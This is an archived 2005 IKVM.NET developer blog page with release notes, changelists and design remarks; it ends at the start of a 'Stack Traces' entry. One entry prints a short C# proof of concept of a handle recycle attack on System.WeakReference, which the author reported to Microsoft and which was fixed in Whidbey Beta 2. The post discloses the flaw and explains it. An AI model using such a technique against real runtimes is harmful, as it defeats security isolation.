<P>The next IKVM release (hopefully due next week) will still be built with Jikes, but future releases will most likely be built with the Eclipse Java Compiler. To make this easier I've used ikvmc to compile it to ecj.exe and created a <A href="http://www.frijters.net/ecj-0.570-ikvm-0.14.0.1.msi">Windows installer</A> that installs ecj.exe and adds IKVM.GNU.Classpath.dll and IKVM.Runtime.dll to the Global Assembly Cache. If you're not on Windows, you can download ecj.exe in this <A href="http://www.frijters.net/ecj-0.570-ikvm-0.14.0.1.zip">zipfile</A>. Note that ecj.exe requires Mono 1.1.8.1 or later.</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		06/29/2005 14:51:00 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=bbeabf7e-75e6-45fb-93c1-40f7556a2454"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=bbeabf7e-75e6-45fb-93c1-40f7556a2454">Comments [0]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Thursday, 23 June 2005</h2></div>
<div class="newsItems"><a name="ad0de30c8-6df1-45bc-b459-45efac26db0e"></a><div class="entry">
	<h3 class="entryTitle">PDC '05</h3>
	<div class="entryBody">
		<P>From September 13 thru 16 I'll be in Los Angeles for the Microsoft Professional Developer Conference.</P>
<P>If anyone wants to meet up and hang out or chat, <A href="mailto:jeroen@frijters.net">drop me a note</A>.</P>
<P><IMG src="http://www.frijters.net/pdc_icon1_48x48.gif"></P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		06/23/2005 15:56:19 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=d0de30c8-6df1-45bc-b459-45efac26db0e"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=d0de30c8-6df1-45bc-b459-45efac26db0e">Comments [0]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Monday, 23 May 2005</h2></div>
<div class="newsItems"><a name="a2bb118cf-4a21-4494-a50f-59177a1c8af1"></a><div class="entry">
	<h3 class="entryTitle">New Snapshot</h3>
	<div class="entryBody">
		<P><B>Partial Trust</B></P>
<P>I did some research into supporting partial trust and it looks like it might be feasible. This snapshot already contains some changes to better support running in partial trust (particularly for IKVM.GNU.Classpath, IKVM.Runtime contains unsafe code so it currently needs to be trusted). On .NET 1.1 non of the built in partial trust permission sets are suitable, because I require ReflectionPermission(ReflectionPermissionFlag.TypeInformation). In Whidbey this permission flag is deprecated, so the story looks more promissing there.</P>
<P>One of the consequences of adding partial trust support is that IKVM.Runtime.dll will need to be split into several parts. At the very least the JNI implementation will need to be in a separate assembly, so that the common non-JNI scenarios won't require SkipVerification permission.</P>
<P><B>Exception Handling</B></P>
<P>I made some major changes to exception handling in this version. However, for Java code nothing should change (except that it hopefully runs a little bit faster), but for .NET/Java interop there are some important changes:</P>
<UL>
<LI>Exceptions generated by the CLR or .NET code (e.g. System.NullReferenceException) will no longer be changed into their Java equivalents for non-Java code. This means that when you catch an exception in IKVM Java code, you'll still see the corresponding Java exception (e.g. java.lang.NullPointerException), but when you rethrow the exception, the original exception gets thrown.</LI>
<LI>When Java code explicitly throws a .NET exception (e.g. System.NullReferenceException) it is no longer remapped to the Java equivalent.</LI>
<LI>Catching exceptions now faithfully corresponds to the IKVM <A HREF="/PermaLink.aspx?guid=07bca016-be8a-4174-878f-e451243c0ff9">type system</A>. This means that you can now use <CODE>catch(cli.System.Exception)</CODE> to catch the unremapped .NET exceptions.</LI></UL>
<P>This is a major step towards my ultimate vision for exception handling, but I'm not nearly there yet. Other changes I want to make include adding more exception state to java.lang.Throwable instead of the WeakHashMap construct that is currently used (the WeakHashMap will still be required to associate the .NET exceptions with their remapped Java exceptions). I also want to use exception filters to check for remapped exceptions, to make the debugging experience better and the bytecode compiler needs to be improved to recognize try {} finally {} constructs so that they can be compiled as .NET try {} finally {} blocks, instead of the currently used and vastly less efficient try {} catch() { throw; }.</P>
<P><B>Other News</B></P>
<P><A href="http://blogs.codehaus.org/people/mproctor/archives/001078_drools_20rc1_with_ikvm.html">Mark Proctor reports</A> that <A href="http://drools.org/">Drools</A> runs on IKVM.</P>
<P><B>Changes:</B></P>
<UL>
<LI>Sync'ed with GNU Classpath cvs.</LI>
<LI>Removed VMClass.forName() implementation (rely on standard implementation instead).</LI>
<LI>Fixed ikvmc to ignore directories in jars.</LI>
<LI>Added "isStatic" parameter to JNI methods ToReflectedMethod and ToReflectedField (this parameter is missing in the JNI specification, but exists in the Sun implementation).</LI>
<LI>Removed workaround for previously unimplemented MethodBase.GetMethodFromHandle in Mono from JNI code.</LI>
<LI>Removed workaround for previously broken GCHandle.IsAllocated in Mono.</LI>
<LI>Removed workaround for previously broken Assembly.GetTypes() in Mono.</LI>
<LI>Disabled finalizer in MemberWrapper (since code unloading isn't supported, members will never be finalized anyway).</LI>
<LI>Added MirandaMethod to MemberFlags.</LI>
<LI>Fixed cosmetic bug in verifier that caused unloadable array types to be named incorrectly.</LI>
<LI>Implemented 1.5 java.lang.String methods (except String.format()).</LI>
<LI>Added ldsfld instruction support to remapper.</LI>
<LI>Implemented ikvmc -compressresources option, to use a simple compression algorithm for resources.</LI>
<LI>Classpath locale information is now in *.properties files instead of classes with resource compression this shaves a couple of hundred KB of the size of IKVM.GNU.Classpath.</LI>
<LI>Many changes to exception handling to improve performance, compatibility and consistency.</LI>
<LI>Added EditorBrowsable(Never) attribute to helper methods in java.lang.Throwable.</LI>
<LI>Fixed method "cloaking" (i.e. hiding .NET methods on Java types in IntelliSense) to hide inherited static methods as well.</LI>
<LI>Various fixes to work towards supporting running in partial trust.</LI>
<LI>Fixed ikvmc bug that caused it to run Java code when tracing was enabled.</LI>
<LI>Added support for applying CodeAccessSecurityAttribute derived attributes (although not at the assembly level yet).</LI>
<LI>Fixed a Miranda bug that caused incorrect classes to be generated for abstract classes implementing java.lang.Comparable but not implementing compareTo.</LI>
<LI>Implemented support for applying attributes to methods/fields defined in map.xml.</LI>
<LI>Changed reflection to disallow reflecting on IKVM.Runtime types (to avoid potential security holes, where Java code can access internal members of IKVM.Runtime).</LI>
<LI>Enabled generation of debug info when a debugger is attached (at the time the runtime is initializing), to allow debugging of dynamically generated code (a Whidbey feature, although in beta 2 it doesn't work yet).</LI>
<LI>Added check to ikvmc to make sure that referenced ikvmc-generated assemblies were compiled with the same version of the ikvm runtime.</LI></UL>
<P>New snapshots: <A href="http://www.frijters.net/ikvmbin.zip"><STRONG>just the binaries</STRONG></A> and <A href="http://www.frijters.net/ikvm.zip"><STRONG>source plus binaries</STRONG></A>.</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		05/23/2005 11:31:14 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=2bb118cf-4a21-4494-a50f-59177a1c8af1"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=2bb118cf-4a21-4494-a50f-59177a1c8af1">Comments [0]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Wednesday, 18 May 2005</h2></div>
<div class="newsItems"><a name="a89473017-4e3e-4699-bc01-b2da197244fa"></a><div class="entry">
	<h3 class="entryTitle">Cross Language Debugging in MonoDevelop</h3>
	<div class="entryBody">
		<P><A href="http://primates.ximian.com/~lluis/blog/pivot/entry.php?id=38">Lluis S&#225;nchez</A> posted some cool screencasts that demo cross language debugging in MonoDevelop [via <A href="http://primates.ximian.com/~miguel/archive/2005/May-17.html">Miguel de Icaza</A>].</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		05/18/2005 14:16:45 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=89473017-4e3e-4699-bc01-b2da197244fa"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=89473017-4e3e-4699-bc01-b2da197244fa">Comments [1]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Wednesday, 11 May 2005</h2></div>
<div class="newsItems"><a name="af9b79846-375f-4890-9340-c67e640fcf0d"></a><div class="entry">
	<h3 class="entryTitle">IKVM 0.14 Released</h3>
	<div class="entryBody">
		<P>I&nbsp;released 0.14&nbsp;and put the files&nbsp;up on <A href="http://sourceforge.net/project/showfiles.php?group_id=69637"><STRONG>SourceForge</STRONG></A>. The bits are identical to Monday's&nbsp;rc2.</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		05/11/2005 14:43:20 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=f9b79846-375f-4890-9340-c67e640fcf0d"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=f9b79846-375f-4890-9340-c67e640fcf0d">Comments [1]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Monday, 09 May 2005</h2></div>
<div class="newsItems"><a name="a3472dfab-5844-4053-9d47-a9b002656046"></a><div class="entry">
	<h3 class="entryTitle">Harmony</h3>
	<div class="entryBody">
		<P>There's been a lot of confusion about <A href="http://mail-archives.apache.org/mod_mbox/incubator-harmony-dev/200505.mbox/%3C3923A844-DEC5-4CC2-ADED-B1F144BB6AF5@apache.org%3E">Harmony</A> in the last couple of days. I don't pretend to speak on behalf of the project, but I wanted to give my take on it.</P>
<P>The primary goal of Harmony is to create a J2SE 5 implementation under the Apache License. Many people have interpreted this as meaning that the ASF would start building a JVM and class library from scratch, but that's not the intention at all (although it is a possible worst case scenario). Talks are ongoing between the FSF and ASF to try and work together to change the GNU Classpath license to be compatible with the Apache License. In this light it is important to note that GNU Classpath is already licensed under a modified version the GPL that is more liberal to attract more developers and users. Another thing to note is that the FSF owns all copyright on GNU Classpath (each individual contributor signs over their copyright to the FSF), so the FSF can relatively easily change the license of GNU Classpath (or, for example, dual license it).</P>
<P>In his "<A href="http://primates.ximian.com/~miguel/archive/2005/May-07.html">Fork in the Open Source Java world</A>" blog entry (a title I obviously disagree with) Miguel argues that the GPL may be a liability instead of an asset for some open source projects. I tend to agree with his view, the GPL and the FSF activism scare many people away, and even with a more liberal license there exist strong motivational factors for companies to work with the community instead of forking a large project and improving only their private version.</P>
<P>As for the pretentious name, all I can say is that I had nothing to do with that :-)</P>
<P><STRONG>Update: </STRONG>Mark Wielaard corrects me:</P><FONT size=2>
<P><EM>And just to correct a little information in Jeroen's latest blog. The FSF/ASF talks are about the general (L)GPL/ASL 2.0 incompatabilities. We do hope to finally solve those since most of them are just legal technicalities and misunderstandings/misinterpretations. (This is something I think is of even more value then this new harmony project).</EM></P>
<P><EM>The current exception statement to the GPL used by GNU Classpath is compatible with and acceptable to the Apache community. But the FSF did say that IF the exception statement was in any way unclear THEN they would certainly be willing to clarify it so that there was no obstacle for adoption of GNU Classpath. There currently doesn't seem any need to do this though.</EM></P></FONT>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		05/09/2005 10:05:34 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=3472dfab-5844-4053-9d47-a9b002656046"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=3472dfab-5844-4053-9d47-a9b002656046">Comments [0]</a>
		
		<br clear="all">
	</div>
</div><a name="aa7df0b3e-9487-477c-b1dc-1c59586ca72b"></a><div class="entry">
	<h3 class="entryTitle">Release Candidate 2</h3>
	<div class="entryBody">
		<P>Thanks to <A href="http://weblog.saxondotnet.org/archives/2005/05/wondering_where.html">M. David Peterson for reporting a regression</A> in rc1. I fixed that and created rc2.</P>
<P>Files:</P>
<P><A href="http://www.frijters.net/ikvm-0.14-rc2.zip">ikvm-0.14-rc2.zip</A>&nbsp; (source + binaries)<BR><A href="http://www.frijters.net/ikvmbin-0.14-rc2.zip">ikvmbin-0.14-rc2.zip</A>&nbsp;&nbsp; (binaries)</P>
<P>Changes:</P>
<UL>
<LI>Fixed regression in member access check that caused public members inherited from a non-public base class in a different package not to be accessible.</LI>
<LI>Merged ikvm-native FreeBSD compilation fixes from Mono's svn back in.</LI>
<LI>Updated all assembly versions to 0.14.0.1 (including JVM.DLL that I forgot in rc1).</LI></UL>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		05/09/2005 09:24:36 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=a7df0b3e-9487-477c-b1dc-1c59586ca72b"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=a7df0b3e-9487-477c-b1dc-1c59586ca72b">Comments [0]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Monday, 02 May 2005</h2></div>
<div class="newsItems"><a name="ab9b950c5-eb34-4b81-975a-1c95492736fb"></a><div class="entry">
	<h3 class="entryTitle">IKVM 0.14 rc1</h3>
	<div class="entryBody">
		<A href="http://www.gnu.org/software/classpath/announce/20050429.html">GNU Classpath 0.15</A> was released yesterday, so based on that I'm releasing a new version of IKVM. Besides the many improvements to GNU Classpath, there have been a bunch of IKVM fixes and two major new features: support for defining .NET properties and for applying .NET attributes. Both these features are controlled via the xml remap file. Here's an example Java class with corresponding xml file:<PRE>public class IntList
{
  private int[] list;
  public IntList(int size)
  {
    list = new int[size];
  }
  public void setItem(int index, int value)
  {
    list[index] = value;
  }
  public int getItem(int index)
  {
    return list[index];
  }
}</PRE><PRE>&lt;?xml version="1.0" encoding="utf-8" ?&gt;
  &lt;root&gt;
    &lt;assembly&gt;
     &lt;class name="IntList"&gt;
       &lt;attribute type="System.Reflection.DefaultMemberAttribute, mscorlib" sig="(Ljava.lang.String;)V"&gt;
         &lt;parameter&gt;Item&lt;/parameter&gt;
       &lt;/attribute&gt;
       &lt;property name="Item" sig="(I)I"&gt;
         &lt;getter name="getItem" sig="(I)I" /&gt;
         &lt;setter name="setItem" sig="(II)V" /&gt;
       &lt;/property&gt;
     &lt;/class&gt;
  &lt;/assembly&gt;
&lt;/root&gt;</PRE>
<P>When IntList.java is compiled to IntList.class and then ikvmc'ed using:</P><PRE>   ikvmc IntList.class -remap:IntList.xml</PRE>
<P>The resulting IntList.dll will be usable from C# like this:</P><PRE>   IntList l = new IntList(10);
   l[4] = 42;
   Console.WriteLine(l[4]);
</PRE>
<P>Valdemar Mejstad created a tool to automatically generate the xml to define properties based on Java's java.beans.BeanInfo. The source is available here: <A href="http://www.frijters.net/MapFileGenerator.java">MapFileGenerator.java</A>.</P>
<P>Files:</P>
<P><A href="http://www.frijters.net/ikvm-0.14-rc1.zip">ikvm-0.14-rc1.zip</A>&nbsp; (source + binaries)<BR><A href="http://www.frijters.net/ikvmbin-0.14-rc1.zip">ikvmbin-0.14-rc1.zip</A>&nbsp;&nbsp; (binaries)</P>
<P>Changes:</P>
<UL>
<LI>Integrated GNU Classpath 0.15 release</LI>
<LI>Dropped support for Mono 1.0.x, because Mono 1.1.x is now the recommended (by the Mono team) version to use.</LI>
<LI>Made some optimizations to System.arraycopy().</LI>
<LI>Removed the previously deprecated ikvm.lang.ByteArrayHack class.</LI>
<LI>Merged fixes to gnu.java.nio.channels.FileChannelImpl from Classpath.</LI>
<LI>Added CLR "bitness" (32 or 64) to ikvm -version output.</LI>
<LI>Fixed ByteCodeHelper.DynamicCast() and ByteCodeHelper.DynamicInstance() to handle null references properly (always succeed/fail the cast/instanceof, without trying to load the type).</LI>
<LI>Changed os.arch for "AMD64" to "amd64" to match JDK.</LI>
<LI>Added sun.arch.data.model system property.</LI>
<LI>Fixed VMThread.suspend()/resume() to not throw exceptions if invalid calls are done.</LI>
<LI>Fixed VMThread.stop() to better handle suspended threads.</LI>
<LI>Fixed a bug in invocation of JNI_OnLoad (if the method exited with a pending exception, the exception wasn't dispatched).</LI>
<LI>Added GC.KeepAlive() to FileChannelImpl.flush() to make sure the file channel isn't GCed (and thus closed) while the native method is running.</LI>
<LI>Fixed verifier to correctly identify stack overflows when double/long values are involved.</LI>
<LI>Fixed verifier to reject empty try blocks.</LI>
<LI>Fixed bug in VMTimeZone.inDaylightTime() [Fix by Alexander Zuev].</LI>
<LI>Fixed a whole bunch of bugs in java.lang.reflect.Field [Reported by Alexander Zuev].</LI>
<LI>Created two subclasses of CompiledTypeWrapper to handle the special cases for remapped and ghost type to make the normal types more efficient.</LI>
<LI>Added a micro optimization to FieldWrapper to avoid having to call FieldInfo.IsLiteral on each reflective field access, because FieldInfo.IsLiteral turns out to be quite expensive on the Microsoft CLR.</LI>
<LI>Removed -monoBugWorkaround switch from IKVM.GNU.Classpath.dll build script, since Mono 1.1.4 and later no longer require it.</LI>
<LI>Fixed bug in protected member access check (it was too strict, requiring the referenced class to be visible).</LI>
<LI>Improved error message when core library doesn't match runtime version.</LI>
<LI>Implemented memory mapped I/O.</LI>
<LI>Added support for defining properties through map.xml file.</LI>
<LI>Added check to ikvmc to prevent signing assemblies that reference unsigned assemblies.</LI>
<LI>Added support for adding custom attributes to assembly, classes, fields, methods and constructors in the map.xml file.</LI>
<LI>Removed -enabletls option from ikvmc (fields can now be marked as thread local by adding a custom attribute).</LI>
<LI>Added AssemblyCopyrightAttribute to IKVM.GNU.Classpath.dll.</LI>
<LI>Fixed a bug in .NET type reflection handling of explicit method implementations.</LI>
<LI>Fixed bug in JNI return value marshaling for methods with boolean return type.</LI>
<LI>Fixed NullReferenceException bug when compiling class with native finalize method.</LI>
<LI>Fixed JNI to continue to work during "finalization for exit".</LI>
<LI>Implemented System.runFinalizersOnExit(boolean). By default, Java finalizers no longer run at application exit.</LI></UL>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		05/02/2005 14:39:33 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=b9b950c5-eb34-4b81-975a-1c95492736fb"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=b9b950c5-eb34-4b81-975a-1c95492736fb">Comments [0]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Monday, 18 April 2005</h2></div>
<div class="newsItems"><a name="ac1b8dcf4-96a3-4464-9897-fabf86a6bf6f"></a><div class="entry">
	<h3 class="entryTitle">Whidbey Beta 2</h3>
	<div class="entryBody">
		<P>I downloaded Whidbey Beta 2 from MSDN (subscription required) and installed it on my AMD64 machine (recently repaved with WinXP x64 RTM). Installation went very smooth and IKVM builds and runs its test suite (without requiring the workaround that the Februari CTP needed).</P>
<P><B>My Very Own Breaking Change</B></P>
<P>A long time ago I wrote about problems with the <A href="/PermaLink.aspx?guid=EC330149-7DA0-473A-B693-1C51EB03496A">C# destructor</A> and used System.WeakReference as example. Recently I discovered a related, but more serious problem with System.WeakReference and reported it to Microsoft.</P>
<P>Here is some evil code:</P><PRE>using System;
class Class1 : WeakReference
{
    Class1(object obj)
      : base(obj)
    {
    }
    
    static void Main(string[] args)
    {
        Class1 r = new Class1("foo");
        Console.WriteLine(r.Target);
        Class1 clone = (Class1)r.MemberwiseClone();
        GC.Collect();
        GC.WaitForPendingFinalizers();
        new Class1("bar");
        Console.WriteLine(clone.Target);
    }
}</PRE>
<P>The last statement prints out <CODE>bar</CODE>. Notice that we aren't supposed to have a reference to <CODE>bar</CODE>. This is a variation of a handle recycle attack.</P>
<P>In Beta 2 this problem was "fixed" by adding an unmanaged code inheritance demand to System.WeakReference, so untrusted code will not be able to subclass WeakReference (which is needed to get access to MemberwiseClone). This is a (minor) breaking change, but obviously the right thing to do.</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		04/18/2005 21:04:12 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=c1b8dcf4-96a3-4464-9897-fabf86a6bf6f"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=c1b8dcf4-96a3-4464-9897-fabf86a6bf6f">Comments [1]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Monday, 21 March 2005</h2></div>
<div class="newsItems"><a name="a083a4d28-c4bc-427b-bebc-0b72a6d6251b"></a><div class="entry">
	<h3 class="entryTitle">Saxon.NET RC1</h3>
	<div class="entryBody">
		<P>The Saxon.NET developers have announced <A href="http://www.xsltblog.com/archives/2005/03/saxonnet_10_rc1.html">RC1 of Saxon.NET</A>. I like this project, because it is a good example of the kind of project I envisioned when I started IKVM.NET. They take an existing Java library and convert it to a .NET assembly using ikvmc and they add important value by packaging and testing the converted assembly and by providing examples and utilities.</P>
<P><B>64-bit</B></P>
<P>In unrelated news, I've been able to successfully run my internal test suite on x64 (An AMD64 system running Windows XP Professional x64 Edition RC1 running the Whidbey February CTP). I had to work around one Whidbey February CTP specific bug and had to make a change to VMThread.stop() relating to a Whidbey change in Thread.Abort(). It's too bad there isn't an x64 Windows version of Eclipse yet, because that would make a good real world test.</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		03/21/2005 16:47:35 (W. Europe Standard Time, UTC+01:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=083a4d28-c4bc-427b-bebc-0b72a6d6251b"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=083a4d28-c4bc-427b-bebc-0b72a6d6251b">Comments [2]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Wednesday, 02 March 2005</h2></div>
<div class="newsItems"><a name="ad0a13567-d846-476e-9cc8-5f5e49dc7b62"></a><div class="entry">
	<h3 class="entryTitle">How Not To Fix Bugs</h3>
	<div class="entryBody">
		<P>At the moment ikvm/runtime/JniInterface.cs contains the following workaround:</P><PRE>#if __MonoCS__ 
  // MONOBUG mcs requires this bogus fixed construct (and Microsoft doesn't allow it)
  fixed(void** p = &amp;pJavaVM-&gt;firstVtableEntry) { pJavaVM-&gt;vtable = p; }
#else
  pJavaVM-&gt;vtable = &amp;pJavaVM-&gt;firstVtableEntry;
#endif</PRE>
<P>Up until Mono 1.1.4 this workaround is required, but current Mono svn has a fixed mcs that doesn't require (nor allow) the workaround.</P>
<P>This means that current IKVM cvs isn't compilable with current Mono svn and that's dumb. The proper way to fix mcs would have been to temporarily (at least until after the next Mono release) allow the incorrect usage of fixed and issue a warning that such usage is illegal and will stop working in a future release.</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		03/02/2005 11:05:32 (W. Europe Standard Time, UTC+01:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=d0a13567-d846-476e-9cc8-5f5e49dc7b62"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=d0a13567-d846-476e-9cc8-5f5e49dc7b62">Comments [0]</a>
		
		<br clear="all">
	</div>
</div><a name="aaf22394a-3d27-43a6-b15d-b408d64a61a5"></a><div class="entry">
	<h3 class="entryTitle">IKVM 0.12 Released</h3>
	<div class="entryBody">
		<P>I put the 0.12 release up on <A href="http://sourceforge.net/project/showfiles.php?group_id=69637">SourceForge</A>. Basically the same as yesterday's snapshot, only now the version is 0.12.0.0 and the binaries are signed.</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		03/02/2005 10:51:21 (W. Europe Standard Time, UTC+01:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=af22394a-3d27-43a6-b15d-b408d64a61a5"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=af22394a-3d27-43a6-b15d-b408d64a61a5">Comments [1]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Tuesday, 01 March 2005</h2></div>
<div class="newsItems"><a name="a9ea7e376-98e6-43a2-968b-c70194e79a5f"></a><div class="entry">
	<h3 class="entryTitle">New Snapshot</h3>
	<div class="entryBody">
		<P>I made a new snapshot that will become the 0.12 release if no showstoppers are found. Based on the Eclipse inlining mess I decided to measure how much of a performance hit it is to disable inlining for all non-leaf methods and I found it to be very small for the benchmarks I tried. This combined with the fact that inlining would need to be disabled (for many methods) in the future to support the Java security model, I decided to go ahead and do that already. This is the first IKVM version that actually supports running Eclipse 3.0 and using it to develop Java code (even if it is horribly slow to get warmed up).</P>
<P>I've also disabled dynamic binding in ikvmc compilation, because it doesn't really work. The problem is that package access doesn't work across assemblies, so any package accessible types/members in statically compiled code cannot be accessed by dynamically loaded classes. I may re-enable this functionality at some point in the future, by combining it with an option to make all package accessible types/members public.</P>
<P>For dynamically compiled code, dynamic binding continues to work (to support scenarios were the more eager loading of classes by IKVM would otherwise <A HREF="/PermaLink.aspx?guid=66">cause problems</A>).</P>
<P>Changes:</P>
<UL>
<LI>Integrated GNU Classpath 0.14 release.</LI>
<LI>Added ToString to ClassLoaderWrapper, to enable efficient tracing.</LI>
<LI>Added support for HideFromJava attribute to map.xml parser.</LI>
<LI>Added JNI trace switch.</LI>
<LI>Added extensive tracing to JNI code.</LI>
<LI>Added JVM.EnableReflectionOnMethodsWithUnloadableTypeParameters HACK to allow ikvm.exe to do reflection on main class that has unloadable types in method parameters.</LI>
<LI>Added JVM.DisableDynamicBinding to disable dynamic binding when compiling with ikvmc.</LI>
<LI>Cleaned up ikvmc warning/error messages.</LI>
<LI>Added TypeWrapper.EnsureLoadable() to consistently handle unloadable types.</LI>
<LI>Added generation of warning messages (in ikvmc scenario) to UnloadableTypeWrapper.</LI>
<LI>Changed JNI method ptr field name to get more consistent JNI trace messages.</LI>
<LI>Fixed JNI bug that caused JNI_GetCreatedJavaVMs not to work if the JVM wasn't started with JNI_CreateJavaVM.</LI>
<LI>Added exception mapping methods __&lt;map&gt;() to java.lang.Throwable (not visible from Java and most other CLR languages, but used internally by IKVM).</LI>
<LI>java.lang.ExceptionHelper is no longer public.</LI>
<LI>Disabled method inlining for non-leaf methods.</LI></UL>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		03/01/2005 10:09:25 (W. Europe Standard Time, UTC+01:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=9ea7e376-98e6-43a2-968b-c70194e79a5f"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=9ea7e376-98e6-43a2-968b-c70194e79a5f">Comments [0]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Tuesday, 22 February 2005</h2></div>
<div class="newsItems"><a name="a657d6fda-b975-494f-ad93-c22e11d19b84"></a><div class="entry">
	<h3 class="entryTitle">Stack Traces</h3>
	<div class="entryBody">
		<P>Corey comments on the previous entry:</P>
